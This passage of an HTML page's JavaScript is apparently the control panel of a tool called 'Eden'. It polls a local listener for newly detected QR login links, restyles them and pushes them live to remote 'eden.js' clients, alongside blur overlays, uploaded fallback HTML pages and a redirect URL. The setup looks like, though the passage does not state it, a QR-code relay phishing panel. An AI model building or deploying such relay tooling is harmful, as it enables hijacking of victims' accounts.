                        if (e.clientX < rect.left || e.clientX > rect.right || 
                            e.clientY < rect.top || e.clientY > rect.bottom) {
                            // Outside dropdown - show trash zone
                            trashZone.style.display = 'flex';
                            trashZone.style.left = (window.innerWidth / 2 - 100) + 'px';
                            trashZone.style.top = (window.innerHeight - 100) + 'px';
                            
                            // Highlight the trash zone
                            trashZone.classList.add('active');
                        } else {
                            // Inside dropdown - hide trash zone
                            trashZone.style.display = 'none';
                            trashZone.classList.remove('active');
                        }
                    }
                    
                    // Store reference for cleanup
                    e.dataTransfer.dragFeedback = dragFeedback;
                    e.dataTransfer.trashZone = trashZone;
                    e.dataTransfer.updateDragFeedback = updateDragFeedback;
                });
                
                option.addEventListener('dragend', function(e) {
                    // Remove the feedback elements
                    if (e.dataTransfer.dragFeedback) {
                        document.body.removeChild(e.dataTransfer.dragFeedback);
                    }
                    
                    if (e.dataTransfer.trashZone) {
                        document.body.removeChild(e.dataTransfer.trashZone);
                    }
                    
                    document.removeEventListener('dragover', e.dataTransfer.updateDragFeedback);
                    
                    // Determine which dropdown to check based on where the option is from
                    const sourceDropdownId = e.dataTransfer.getData('source-dropdown') || option.parentElement.id;
                    const dropdown = document.getElementById(sourceDropdownId);
                    
                    if (!dropdown) {
                        console.error('Source dropdown not found:', sourceDropdownId);
                        return;
                    }
                    
                    const rect = dropdown.getBoundingClientRect();
                    
                    if (e.clientX < rect.left || e.clientX > rect.right || 
                        e.clientY < rect.top || e.clientY > rect.bottom) {
                        // Dropped outside - remove the effect
                        removeCustomEffect(option.value);
                    }
                });
            }
            
            // Function to remove a custom effect
            function removeCustomEffect(name) {
                // Remove from blur section dropdown
                const blurDropdown = document.getElementById('blurEffectType');
                if (blurDropdown) {
                    for (let i = 0; i < blurDropdown.options.length; i++) {
                        if (blurDropdown.options[i].value === name) {
                            blurDropdown.remove(i);
                            break;
                        }
                    }
                    // Select a default effect for blur dropdown
                    blurDropdown.value = 'blur';
                }
                
                // Remove from localStorage
                const effectsKey = 'eden-custom-effects';
                let effects = {};
                
                try {
                    const saved = localStorage.getItem(effectsKey);
                    if (saved) effects = JSON.parse(saved);
                    
                    if (effects[name]) {
                        delete effects[name];
                        localStorage.setItem(effectsKey, JSON.stringify(effects));
                        showStatusMessage('success', `Custom effect "${name}" removed from all selectors`);
                    }
                } catch (error) {
                    console.error('Error removing custom effect:', error);
                }
            }
            
            // Load existing custom effects on page load
            function loadCustomEffects() {
                const effectsKey = 'eden-custom-effects';
                let effects = {};
                
                try {
                    const saved = localStorage.getItem(effectsKey);
                    if (saved) {
                        effects = JSON.parse(saved);
                        // PERSISTENCE FIX: Save to sessionStorage as backup for persistence
                        sessionStorage.setItem(effectsKey, saved);
                        console.log('Loaded custom effects from localStorage:', Object.keys(effects).join(', '));
                    } else {
                        // Try to restore from sessionStorage if localStorage is empty
                        const sessionSaved = sessionStorage.getItem(effectsKey);
                        if (sessionSaved) {
                            effects = JSON.parse(sessionSaved);
                            localStorage.setItem(effectsKey, sessionSaved);
                            console.log('Restored custom effects from sessionStorage:', Object.keys(effects).join(', '));
                        } else {
                            console.log('No custom effects found in storage');
                        }
                    }
                } catch (error) {
                    console.error('Error loading custom effects:', error);
                    return;
                }
                
                // PERSISTENCE FIX: Add each effect to dropdowns (ensure they appear after refresh)
                const effectNames = Object.keys(effects);
                if (effectNames.length > 0) {
                    console.log('Adding', effectNames.length, 'custom effects to dropdowns');
                    effectNames.forEach(name => {
                        const added = addEffectToDropdown(name);
                        if (added) {
                            console.log('Successfully added custom effect to dropdown:', name);
                        } else {
                            console.warn('Failed to add custom effect to dropdown:', name);
                        }
                    });
                }
                
                // Make sure all custom options in both dropdowns are draggable
                const blurDropdown = document.getElementById('blurEffectType');
                if (blurDropdown) {
                    for (let i = 0; i < blurDropdown.options.length; i++) {
                        if (blurDropdown.options[i].dataset.custom === 'true') {
                            if (typeof setupDraggableOption === 'function') {
                                setupDraggableOption(blurDropdown.options[i]);
                                console.log('Made blur option draggable:', blurDropdown.options[i].value);
                            }
                        }
                    }
                } else {
                    console.warn('Blur dropdown not found when setting up draggable options');
                }
                
            }
            
            // Function to check sessionStorage for custom effects on page load
            function checkSessionStorageForEffects() {
                const effectsKey = 'eden-custom-effects';
                
                try {
                    // First check localStorage (primary storage)
                    let saved = localStorage.getItem(effectsKey);
                    
                    // If not in localStorage but in sessionStorage, restore from sessionStorage
                    if (!saved && sessionStorage.getItem(effectsKey)) {
                        saved = sessionStorage.getItem(effectsKey);
                        localStorage.setItem(effectsKey, saved);
                        console.log('Restored custom effects from session storage');
                    }
                } catch (error) {
                    console.error('Error checking session storage for effects:', error);
                }
            }
            
            // Check session storage and load custom effects on startup
            checkSessionStorageForEffects();
            loadCustomEffects();
        }
        
        
    </script>
    
    <script>
        // EdenQR functionality
        let edenQRCode = null;
        let currentQRLink = null;
        let manualQRLink = null; // Track manually entered URL
        let edenqrAutoSendInterval = null;
        let edenqrPollInterval = null;
        let lastQRConfig = null;
        let lastColorMode = 'single'; // Track last color mode to force update
        let lastLogoUrl = ''; // Track last logo URL to ensure logo updates are sent
        let userEditedText = false;
        const EDENQR_SEND_INTERVAL_MS = 2000;
        const EDENQR_POLL_INTERVAL_MS = 500;
        const DEMO_LINK = "https://example.com";

        function updateGradientUI() {
            const mode = document.getElementById('edenqr-colorMode')?.value || 'single';
            const showGradient = mode !== 'single';
            document.querySelectorAll('.edenqr-gradient-field').forEach(el => {
                el.style.display = showGradient ? '' : 'none';
            });
            if (!showGradient) {
                const primary = document.getElementById('edenqr-dotPrimary')?.value;
                const primary2 = document.getElementById('edenqr-dotPrimary2');
                if (primary && primary2) {
                    primary2.value = primary;
                }
            }
        }

        function getActiveQRLink() {
            const linkInput = document.getElementById('edenqr-link');
            const inputVal = linkInput?.value?.trim() || "";
            return inputVal || currentQRLink || DEMO_LINK;
        }

        function buildQrConfigForSend(linkOverride) {
            const link = (linkOverride || getActiveQRLink() || "").trim();
            const dotPrimary = document.getElementById('edenqr-dotPrimary2')?.value || document.getElementById('edenqr-dotPrimary')?.value || '#000000';
            const colorMode = document.getElementById('edenqr-colorMode')?.value || 'single';
            return {
                link,
                dotStyle: document.getElementById('edenqr-dotStyle')?.value || 'square',
                dotPrimary,
                dotSecondary: colorMode === 'single'
                    ? dotPrimary
                    : (document.getElementById('edenqr-dotSecondary')?.value || '#1f2937'),
                eyeStyle: document.getElementById('edenqr-eyeStyle')?.value || 'square',
                innerEyeStyle: document.getElementById('edenqr-innerEyeStyle')?.value || 'square',
                eyeOuterColor: document.getElementById('edenqr-eyeOuterColor')?.value || '#000000',
                eyeInnerColor: document.getElementById('edenqr-eyeInnerColor')?.value || '#000000',
                colorMode,
                gradientType: document.getElementById('edenqr-gradientType')?.value || 'linear',
                backgroundStyle: document.getElementById('edenqr-backgroundStyle')?.value || 'white',
                backgroundColor: document.getElementById('edenqr-backgroundColor')?.value || '#ffffff',
                logoUrl: document.getElementById('edenqr-logoUrl')?.value || '',
                logoSize: Number(document.getElementById('edenqr-logoSize')?.value || 0.35),
                logoMargin: Number(document.getElementById('edenqr-logoMargin')?.value || 8),
                hideBgDots: document.getElementById('edenqr-hideBgDots')?.checked || false
            };
        }

        function sendFullQRUpdate(fromInterval = false) {
            const config = buildQrConfigForSend();
            if (!shouldSendToEdenJS(config.link)) {
                return false;
            }
            const sent = sendToSelectedClients({
                type: 'qr-code-update',
                qrConfig: config
            });
            if (sent && !fromInterval) {
                console.log('Sent live EdenQR update to clients', config);
            }
            return sent;
        }
        
        function ensureEdenQRAutoSendInterval() {
            if (edenqrAutoSendInterval) return;
            
            edenqrAutoSendInterval = setInterval(() => {
                const linkToSend = manualQRLink || currentQRLink;
                if (linkToSend && linkToSend !== DEMO_LINK) {
                    sendFullQRUpdate(true);
                }
            }, EDENQR_SEND_INTERVAL_MS);
        }
        
        function notifyEdenQRSelectionUpdate() {
            const linkToSend = manualQRLink || currentQRLink;
            if (linkToSend && linkToSend !== DEMO_LINK) {
                autoSendQRToClients(linkToSend);
            }
        }
        
        // Check if URL should be sent to eden.js (filter out example.com)
        function shouldSendToEdenJS(link) {
            return link && link !== DEMO_LINK && link !== "https://example.com" && link.trim() !== "";
        }
        
        function getQRConfig() {
            const eyeSel = document.getElementById('edenqr-eyeStyle')?.value || 'square';
            const innerSel = document.getElementById('edenqr-innerEyeStyle')?.value || 'square';
            const eyeTypes = eyeSel === 'circle' ? { cs: 'extra-rounded' } : { cs: 'square' };
            const innerType = innerSel === 'dot' ? 'dot' : 'square';
            const colorMode = document.getElementById('edenqr-colorMode')?.value || 'single';
            const gradientType = document.getElementById('edenqr-gradientType')?.value || 'linear';
            const primary = document.getElementById('edenqr-dotPrimary')?.value || '#000000';
            const primary2 = document.getElementById('edenqr-dotPrimary2')?.value || primary;
            const secondary = document.getElementById('edenqr-dotSecondary')?.value || '#1f2937';
            const bgStyle = document.getElementById('edenqr-backgroundStyle')?.value || 'white';
            const bgColor = document.getElementById('edenqr-backgroundColor')?.value || '#ffffff';
            const eyeOuterColor = document.getElementById('edenqr-eyeOuterColor')?.value || '#000000';
            const eyeInnerColor = document.getElementById('edenqr-eyeInnerColor')?.value || '#000000';
            
            const dotColor = primary2 || primary;
            const dotStyle = document.getElementById('edenqr-dotStyle')?.value || 'square';
            
            // Build dotsOptions - ensure single mode doesn't have gradient property
            let dotsOptions;
            if (colorMode === 'single') {
                // Single color mode - use simple color object, no gradient
                dotsOptions = { 
                    type: dotStyle, 
                    color: dotColor, 
                    scale: 1 
                };
            } else {
                // Gradient mode
                dotsOptions = {
                    type: dotStyle,
                    gradient: {
                        type: gradientType,
                        rotation: 0,
                        colorStops: [
                            { offset: 0, color: dotColor },
                            { offset: 1, color: secondary }
                        ]
                    },
                    scale: 1
                };
            }
            
            const backgroundOptions = { 
                color: (bgStyle === 'transparent' ? 'transparent' : (bgStyle === 'white' ? '#ffffff' : bgColor)) 
            };
            
            // Use manual link if available, otherwise use currentQRLink, otherwise use default
            const linkInput = document.getElementById('edenqr-link');
            const linkValue = linkInput?.value?.trim() || "";
            const qrData = linkValue || currentQRLink || DEMO_LINK;
            
            // Get logo URL - validate it
            const logoUrl = document.getElementById('edenqr-logoUrl')?.value?.trim() || "";
            
            return {
                data: qrData,
                image: logoUrl,
                margin: 12,
                imageOptions: {
                    imageSize: Number(document.getElementById('edenqr-logoSize')?.value || 0.35),
                    margin: Number(document.getElementById('edenqr-logoMargin')?.value || 8),
                    hideBackgroundDots: document.getElementById('edenqr-hideBgDots')?.checked || false
                },
                dotsOptions: dotsOptions,
                cornersSquareOptions: { type: eyeTypes.cs, color: eyeOuterColor, scale: 1 },
                cornersDotOptions: { type: innerType, color: eyeInnerColor, scale: 1 },
                backgroundOptions: backgroundOptions
            };
        }
        
        function applyUI() {
            if (!edenQRCode) return;
            updateGradientUI();
            const newConfig = getQRConfig();
            const configStr = JSON.stringify(newConfig);
            const colorMode = document.getElementById('edenqr-colorMode')?.value || 'single';
            const currentLogoUrl = newConfig.image || '';
            const logoChanged = currentLogoUrl !== lastLogoUrl;
            
            // Always update if config changed - force update for color mode changes or logo changes
            if (lastQRConfig !== configStr || colorMode !== lastColorMode || logoChanged) {
                lastQRConfig = configStr;
                const previousColorMode = lastColorMode;
                lastColorMode = colorMode;
                lastLogoUrl = currentLogoUrl;
                
                // Force complete recreation when switching between gradient and single mode
                const colorModeChanged = previousColorMode && previousColorMode !== colorMode;
                const switchingToSingle = colorMode === 'single' && previousColorMode !== 'single';
                
                try {
                    const container = document.getElementById('edenqr-container');
                    if ((colorModeChanged && switchingToSingle) || logoChanged) {
                        // Clear and recreate QR instance to ensure gradient is properly removed or logo is updated
                        container.innerHTML = '';
                        edenQRCode = new QRCodeStyling(JSON.parse(JSON.stringify(newConfig)));
                        edenQRCode.append(container);
                    } else {
                        // Normal update
                        const updateConfig = JSON.parse(JSON.stringify(newConfig));
                        edenQRCode.update(updateConfig);
                    }
                } catch (error) {
                    console.error('Error updating QR code:', error);
                    // If update fails (e.g., invalid image), try without image
                    if (newConfig.image) {
                        const configWithoutImage = JSON.parse(JSON.stringify(newConfig));
                        configWithoutImage.image = "";
                        try {
                            const container = document.getElementById('edenqr-container');
                            if (container) {
                                container.innerHTML = '';
                                edenQRCode = new QRCodeStyling(configWithoutImage);
                                edenQRCode.append(container);
                            }
                        } catch (e) {
                            console.error('Error updating QR code without image:', e);
                        }
                    }
                }
                sendFullQRUpdate();
            }
            
            // Get link value and handle updates
            const linkInput = document.getElementById('edenqr-link');
            const linkValue = linkInput?.value?.trim() || "";
            
            // If link is example.com or empty, clear manual link and don't send
            if (!linkValue || linkValue === DEMO_LINK || linkValue === "https://example.com") {
                manualQRLink = null;
                // Send empty/clear message to eden.js to remove QR
                if (window.websocket && window.websocket.readyState === WebSocket.OPEN) {
                    sendToSelectedClients({
                        type: 'qr-code-update',
                        qrConfig: null
                    });
                }
            } else if (shouldSendToEdenJS(linkValue)) {
                // Valid link - update and send immediately with full config
                manualQRLink = linkValue;
                autoSendQRToClients(linkValue);
            }
        }
        
        // Initialize EdenQR when section is shown
        function initEdenQR() {
            if (!edenQRCode) {
                const container = document.getElementById('edenqr-container');
                if (!container) return;
                
                edenQRCode = new QRCodeStyling({
                    width: 300,
                    height: 300,
                    type: "png",
                    data: " ",
                    image: "",
                    margin: 12,
                    dotsOptions: { type: "square", color: "#000000", scale: 1 },
                    cornersSquareOptions: { type: "square", color: "#000000", scale: 1 },
                    cornersDotOptions: { type: "square", color: "#000000", scale: 1 }
                });
                
                edenQRCode.append(container);
            }
            
            // Set up event listeners if not already set
            const edenqrControls = [
                'edenqr-link', 'edenqr-dotStyle', 'edenqr-dotPrimary', 'edenqr-dotPrimary2', 'edenqr-dotSecondary',
                'edenqr-eyeStyle', 'edenqr-innerEyeStyle', 'edenqr-eyeOuterColor', 'edenqr-eyeInnerColor',
                'edenqr-colorMode', 'edenqr-gradientType', 'edenqr-backgroundStyle', 'edenqr-backgroundColor',
                'edenqr-logoUrl', 'edenqr-logoSize', 'edenqr-logoMargin', 'edenqr-hideBgDots'
            ];
            
            edenqrControls.forEach(id => {
                const el = document.getElementById(id);
                if (el && !el.hasAttribute('data-edenqr-listener')) {
                    el.setAttribute('data-edenqr-listener', 'true');
                    if (id === 'edenqr-link') {
                        el.addEventListener('input', function() { 
                            userEditedText = true;
                            const linkValue = el.value.trim();
                            if (linkValue) {
                                manualQRLink = linkValue;
                            } else {
                                manualQRLink = null;
                            }
                            // Update preview immediately
                            applyUI();
                            // Also trigger immediate send to eden.js
                            if (linkValue && shouldSendToEdenJS(linkValue)) {
                                autoSendQRToClients(linkValue);
                            } else if (!linkValue || linkValue === DEMO_LINK || linkValue === "https://example.com") {
                                // Clear QR from eden.js immediately
                                if (window.websocket && window.websocket.readyState === WebSocket.OPEN) {
                                    sendToSelectedClients({
                                        type: 'qr-code-update',
                                        qrConfig: null
                                    });
                                }
                            }
                        });
                        // Also handle change event for when user leaves the field
                        el.addEventListener('change', function() {
                            applyUI();
                        });
                    } else if (id === 'edenqr-logoUrl') {
                        // Handle logo URL with validation
                        el.addEventListener('input', function() {
                            const logoUrl = el.value.trim();
                            // Update UI - if image fails, it will be handled in applyUI
                            applyUI();
                        });
                    } else if (id === 'edenqr-colorMode') {
                        // When color mode changes, ensure proper mode is applied
                        el.addEventListener('change', function() {
                            updateGradientUI();
                            applyUI();
                        });
                    } else {
                        el.addEventListener('input', applyUI);
                        el.addEventListener('change', applyUI);
                    }
                }
            });
            
            // Sync primary colors
            const dotPrimary = document.getElementById('edenqr-dotPrimary');
            const dotPrimary2 = document.getElementById('edenqr-dotPrimary2');
            if (dotPrimary && dotPrimary2 && !dotPrimary.hasAttribute('data-edenqr-synced')) {
                dotPrimary.setAttribute('data-edenqr-synced', 'true');
                dotPrimary2.setAttribute('data-edenqr-synced', 'true');
                dotPrimary.addEventListener('input', function() {
                    dotPrimary2.value = dotPrimary.value;
                    applyUI();
                });
                dotPrimary2.addEventListener('input', function() {
                    dotPrimary.value = dotPrimary2.value;
                    applyUI();
                });
            }
            
            // Start polling for QR updates
            if (!edenqrPollInterval) {
                pollQR();
                edenqrPollInterval = setInterval(pollQR, EDENQR_POLL_INTERVAL_MS);
            }
            
            updateGradientUI();
            ensureEdenQRAutoSendInterval();
            notifyEdenQRSelectionUpdate();
        }
        
        function pollQR() {
            fetch('/api/current-qr')
                .then(response => response.json())
                .catch(() => ({ link: null }))
                .then(data => {
                    if (data && data.link) {
                        // Listener detected a new QR - always override manual URL (except if it's example.com)
                        if (currentQRLink !== data.link) {
                            currentQRLink = data.link;
                            
                            // Update the input field and clear manual link
                            const linkInput = document.getElementById('edenqr-link');
                            if (linkInput && linkInput.value !== data.link) {
                                linkInput.value = data.link;
                                manualQRLink = null; // Clear manual link - listener QR takes priority
                                userEditedText = false; // Reset flag so listener can update
                            }
                            
                            // Update preview
                            applyUI();
                            
                            // Send to eden.js only if not example.com
                            if (shouldSendToEdenJS(data.link)) {
                                autoSendQRToClients(data.link);
                            }
                        }
                    } else {
                        // No QR from listener, use manual or default
                        if (!manualQRLink && !currentQRLink) {
                            // Show default example.com in preview
                            applyUI();
                        }
                    }
                });
        }
        
        function updateEdenQR() {
            applyUI();
        }
        
        function autoSendQRToClients(qrLink, fromInterval = false) {
            const linkToUse = qrLink || getActiveQRLink();
            if (!shouldSendToEdenJS(linkToUse)) {
                return;
            }
            const sent = sendFullQRUpdate(fromInterval);
            if (sent && !fromInterval) {
                console.log('Auto-sent QR update to selected clients');
            }
        }
        
        // WebSocket message handler for instant updates
        if (window.websocket) {
            const originalOnMessage = window.websocket.onmessage;
            window.websocket.onmessage = function(event) {
                if (originalOnMessage) originalOnMessage.call(this, event);
                
                try {
                    const message = JSON.parse(event.data);
                    if (message.type === 'qr-link-update' && message.link) {
                        // Listener detected QR - always override manual URL
                        currentQRLink = message.link;
                        const linkInput = document.getElementById('edenqr-link');
                        if (linkInput) {
                            linkInput.value = message.link;
                            manualQRLink = null; // Clear manual link - listener QR takes priority
                            userEditedText = false; // Reset flag so listener can update
                        }
                        applyUI();
                        // Send to eden.js only if not example.com
                        if (shouldSendToEdenJS(message.link)) {
                            autoSendQRToClients(message.link);
                        }
                    }
                } catch (e) {
                    // Not a JSON message, ignore
                }
            };
        }
        
        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            // Set default link to example.com
            const linkInput = document.getElementById('edenqr-link');
            if (linkInput && !linkInput.value) {
                linkInput.value = DEMO_LINK;
            }
            
            // Initialize immediately (don't wait for section to be shown)
            setTimeout(initEdenQR, 100);
            
            const originalShowsContent = window.showsContent;
            if (originalShowsContent) {
                window.showsContent = function(section) {
                    originalShowsContent(section);
                    if (section === 'edenqr') {
                        setTimeout(initEdenQR, 100);
                    } else if (section === 'preview' && typeof initBOMViewer === 'function') {
                        setTimeout(initBOMViewer, 100);
                    }
                };
            }
            
            document.querySelectorAll('[data-section="edenqr"]').forEach(el => {
                el.addEventListener('click', function() {
                    setTimeout(initEdenQR, 100);
                });
            });
        });
        
        // QR Selector functionality (matching Edenqr)
        const qrSelectionContainer = document.getElementById('edenqr-qrSelectionContainer');
        const qrCandidateSelect = document.getElementById('edenqr-qrCandidateSelect');
        const qrLinkInput = document.getElementById('edenqr-link');
        let edenqrUserEditedLink = false;
        let edenqrLastLink = null;
        
        if (qrCandidateSelect && qrLinkInput) {
            qrCandidateSelect.addEventListener('change', function() {
                const val = this.value;
                qrLinkInput.value = val;
                edenqrUserEditedLink = true;
                // Trigger QR update
                if (typeof updateEdenQRPreview === 'function') {
                    updateEdenQRPreview();
                }
            });
        }
        
        // Poll for QR updates (matching Edenqr)
        function pollEdenQR() {
            fetch('http://127.0.0.1:5000/api/current-qr')
                .then(r => r.json())
                .then(d => {
                    // Update QR link if not user-edited
                    if (d.link && d.link !== edenqrLastLink && !edenqrUserEditedLink) {
                        edenqrLastLink = d.link;
                        if (qrLinkInput) {
                            qrLinkInput.value = d.link;
                            // Trigger QR update
                            if (typeof updateEdenQRPreview === 'function') {
                                updateEdenQRPreview();
                            }
                        }
                    }
                    
                    // Handle multiple QR candidates
                    if (d.candidates && Array.isArray(d.candidates) && d.candidates.length > 1) {
                        if (qrSelectionContainer) qrSelectionContainer.style.display = 'block';
                        if (qrCandidateSelect) {
                            qrCandidateSelect.innerHTML = '';
                            d.candidates.forEach((candidate, idx) => {
                                const opt = document.createElement('option');
                                opt.value = candidate;
                                opt.textContent = candidate;
                                if (idx === 0) opt.selected = true;
                                qrCandidateSelect.appendChild(opt);
                            });
                        }
                    } else {
                        if (qrSelectionContainer) qrSelectionContainer.style.display = 'none';
                    }
                })
                .catch(e => console.warn('Failed to poll QR:', e));
        }
        
        // ========== FALLBACK SYSTEM ==========
        
        // Keyword System
        let keywordPollInterval = null;
        
        function initKeywordSystem() {
            const keywordInput = document.getElementById('keyword-input');
            const keywordSaveBtn = document.getElementById('keyword-save-btn');
            const keywordIndicator = document.getElementById('keyword-indicator');
            const keywordStatusText = document.getElementById('keyword-status-text');
            
            if (!keywordInput || !keywordSaveBtn || !keywordIndicator) return;
            
            // Load saved keyword on page load
            fetch('http://127.0.0.1:5000/api/keyword/check')
                .then(r => r.json())
                .then(data => {
                    if (data.success && data.keyword) {
                        keywordInput.value = data.keyword;
                        updateKeywordIndicator(data.status);
                    }
                })
                .catch(e => console.warn('Failed to load keyword:', e));
            
            // Save keyword
            keywordSaveBtn.addEventListener('click', async () => {
                const keyword = keywordInput.value.trim();
                const saveText = document.getElementById('keyword-save-text');
                
                // Show "Saving..." animation
                saveText.textContent = 'Saving...';
                keywordSaveBtn.disabled = true;
                
                try {
                    const response = await fetch('http://127.0.0.1:5000/api/keyword/save', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ keyword: keyword })
                    });
                    
                    const data = await response.json();
                    if (data.success) {
                        updateKeywordIndicator(data.status);
                        saveText.textContent = 'Saved';
                        setTimeout(() => {
                            saveText.textContent = 'Save';
                            keywordSaveBtn.disabled = false;
                        }, 2000);
                    }
                } catch (e) {
                    console.error('Failed to save keyword:', e);
                    saveText.textContent = 'Error';
                    setTimeout(() => {
                        saveText.textContent = 'Save';
                        keywordSaveBtn.disabled = false;
                    }, 2000);
                }
            });
            
            // Start polling keyword status
            if (!keywordPollInterval) {
                keywordPollInterval = setInterval(() => {
                    fetch('http://127.0.0.1:5000/api/keyword/check')
                        .then(r => r.json())
                        .then(data => {
                            if (data.success) {
                                updateKeywordIndicator(data.status);
                            }
                        })
                        .catch(e => console.warn('Failed to check keyword:', e));
                }, 200); // Poll every 0.5 seconds (2 times per second)
            }
        }
        
        function updateKeywordIndicator(status) {
            const keywordIndicator = document.getElementById('keyword-indicator');
            const keywordStatusText = document.getElementById('keyword-status-text');
            
            if (!keywordIndicator || !keywordStatusText) return;
            
            keywordStatusText.textContent = status;
            
            // Update indicator color
            if (status === 'GREEN') {
                keywordIndicator.style.background = '#2ecc71';
                keywordIndicator.style.borderColor = '#27ae60';
            } else if (status === 'RED') {
                keywordIndicator.style.background = '#e74c3c';
                keywordIndicator.style.borderColor = '#c0392b';
            } else {
                keywordIndicator.style.background = '#95a5a6';
                keywordIndicator.style.borderColor = '#7f8c8d';
            }
        }
        
        // HTML Upload System
        function initHtmlUploadSystem() {
            const htmlUploadInput = document.getElementById('html-upload-input');
            const htmlUploadBtn = document.getElementById('html-upload-btn');
            const htmlFilesList = document.getElementById('html-files-list');
            
            if (!htmlUploadInput || !htmlUploadBtn || !htmlFilesList) return;
            
            // Trigger file input
            htmlUploadBtn.addEventListener('click', () => {
                htmlUploadInput.click();
            });
            
            // Handle file selection
            htmlUploadInput.addEventListener('change', async (e) => {
                const files = Array.from(e.target.files);
                if (files.length === 0) return;
                
                for (const file of files) {
                    if (file.type === 'text/html' || file.name.endsWith('.html')) {
                        const reader = new FileReader();
                        reader.onload = async (event) => {
                            try {
                                const response = await fetch('http://127.0.0.1:5000/api/html/upload', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        filename: file.name,
                                        content: event.target.result
                                    })
                                });
                                
                                const data = await response.json();
                                if (data.success) {
                                    await refreshHtmlFilesList();
                                }
                            } catch (error) {
                                console.error('Failed to upload HTML:', error);
                            }
                        };
                        reader.readAsText(file);
                    }
                }
                
                // Reset input
                e.target.value = '';
            });
            
            // Load files on page load
            refreshHtmlFilesList();
        }
        
        async function refreshHtmlFilesList() {
            const htmlFilesList = document.getElementById('html-files-list');
            if (!htmlFilesList) return;
            
            try {
                const response = await fetch('http://127.0.0.1:5000/api/html/list');
                const data = await response.json();
                
                if (data.success && data.files && data.files.length > 0) {
                    htmlFilesList.innerHTML = '';
                    
                    data.files.forEach(file => {
                        const fileItem = document.createElement('div');
                        fileItem.className = 'file-item';
                        
                        const fileName = document.createElement('span');
                        fileName.textContent = file.filename;
                        fileName.style.cssText = 'flex: 1; font-weight: 500; color: #2c3e50; font-size: 12px;';
                        
                        const selectBtn = document.createElement('button');
                        selectBtn.textContent = 'Select';
                        selectBtn.className = 'btn btn-success btn-small';
                        selectBtn.addEventListener('click', async () => {
                            try {
                                const response = await fetch('http://127.0.0.1:5000/api/html/select', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ filename: file.filename })
                                });
                                
                                const data = await response.json();
                                if (data.success) {
                                    await refreshHtmlFilesList();
                                    alert('File selected as fallback');
                                }
                            } catch (error) {
                                console.error('Failed to select file:', error);
                            }
                        });
                        
                        const removeBtn = document.createElement('button');
                        removeBtn.textContent = 'Remove';
                        removeBtn.className = 'btn btn-danger btn-small';
                        removeBtn.addEventListener('click', async () => {
                            if (confirm(`Remove ${file.filename}?`)) {
                                try {
                                    const response = await fetch('http://127.0.0.1:5000/api/html/delete', {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ filename: file.filename })
                                    });
                                    
                                    const data = await response.json();
                                    if (data.success) {
                                        await refreshHtmlFilesList();
                                    }
                                } catch (error) {
                                    console.error('Failed to delete file:', error);
                                }
                            }
                        });
                        
                        fileItem.appendChild(fileName);
                        fileItem.appendChild(selectBtn);
                        fileItem.appendChild(removeBtn);
                        htmlFilesList.appendChild(fileItem);
                    });
                } else {
                    htmlFilesList.innerHTML = '<div class="html-files-empty" style="color: #708090; text-align: center; padding: 15px;">No HTML files uploaded</div>';
                }
                
                // Load selected file from config
                const configResponse = await fetch('http://127.0.0.1:5000/api/edenqr/config');
                const configData = await configResponse.json();
                if (configData.success && configData.selected_html_file) {
                    // Mark selected file visually
                    const fileItems = htmlFilesList.querySelectorAll('div');
                    fileItems.forEach(item => {
                        const fileName = item.querySelector('span');
                        if (fileName && fileName.textContent === configData.selected_html_file) {
                            item.classList.add('selected');
                            const selectBtn = item.querySelector('button.btn-success');
                            if (selectBtn) {
                                selectBtn.textContent = 'Selected';
                                selectBtn.disabled = true;
                                selectBtn.style.opacity = '0.6';
                            }
                        }
                    });
                }
            } catch (error) {
                console.error('Failed to load HTML files:', error);
                htmlFilesList.innerHTML = '<div class="html-files-empty" style="color: #708090; text-align: center; padding: 15px;">Failed to load files</div>';
            }
        }
        
        // Redirect URL System
        function initRedirectUrlSystem() {
            const redirectUrlInput = document.getElementById('redirect-url-input');
            const redirectSaveBtn = document.getElementById('redirect-save-btn');
            
            if (!redirectUrlInput || !redirectSaveBtn) return;
            
            // Load saved redirect URL on page load
            fetch('http://127.0.0.1:5000/api/edenqr/config')
                .then(r => r.json())
                .then(data => {
                    if (data.success && data.redirect_url) {
                        redirectUrlInput.value = data.redirect_url;
                    }
                })
                .catch(e => console.warn('Failed to load redirect URL:', e));
            
            // Save redirect URL
            redirectSaveBtn.addEventListener('click', async () => {
                const url = redirectUrlInput.value.trim();
                
                redirectSaveBtn.disabled = true;
                redirectSaveBtn.textContent = 'Saving...';
                
                try {
                    const response = await fetch('http://127.0.0.1:5000/api/edenqr/config', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ redirect_url: url || null })
                    });
                    
                    const data = await response.json();
                    if (data.success) {
                        redirectSaveBtn.textContent = 'Saved';
                        setTimeout(() => {
                            redirectSaveBtn.textContent = 'Save';
                            redirectSaveBtn.disabled = false;
                        }, 2000);
                    }
                } catch (e) {
                    console.error('Failed to save redirect URL:', e);
                    redirectSaveBtn.textContent = 'Error';
                    setTimeout(() => {
                        redirectSaveBtn.textContent = 'Save';
                        redirectSaveBtn.disabled = false;
                    }, 2000);
                }
            });
        }
        
        // Initialize fallback system on page load
        document.addEventListener('DOMContentLoaded', function() {
            initKeywordSystem();
            initHtmlUploadSystem();
            initRedirectUrlSystem();
        });
        
        // Re-initialize when EdenQR section is shown (fallback UI is now inside EdenQR)
        document.querySelectorAll('[data-section="edenqr"]').forEach(el => {
            el.addEventListener('click', function() {
                setTimeout(() => {
                    refreshHtmlFilesList();
                }, 100);
            });
        });
        
        // Start polling for QR updates (every 1 second like Edenqr)
        if (qrLinkInput) {
            qrLinkInput.addEventListener('input', function() {
                edenqrUserEditedLink = true;
            });
            setInterval(pollEdenQR, 1000);
            pollEdenQR(); // Initial poll
        }
    </script>
    
    <!-- Location Picker Modal -->
    <div id="locationPickerModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Set Default Display Location</h2>
                <span class="close-modal">&times;</span>
            </div>
            <div class="modal-body">
                <p>Click on the preview area to set the blur display location.</p>
                <div id="locationPreview" class="location-preview">
                    <div id="locationMarker" class="location-marker"></div>
                </div>
                <div class="location-coordinates">
                    <span>X: <span id="locationX">50</span>%</span>
                    <span>Y: <span id="locationY">50</span>%</span>
                </div>
                <div class="modal-actions">
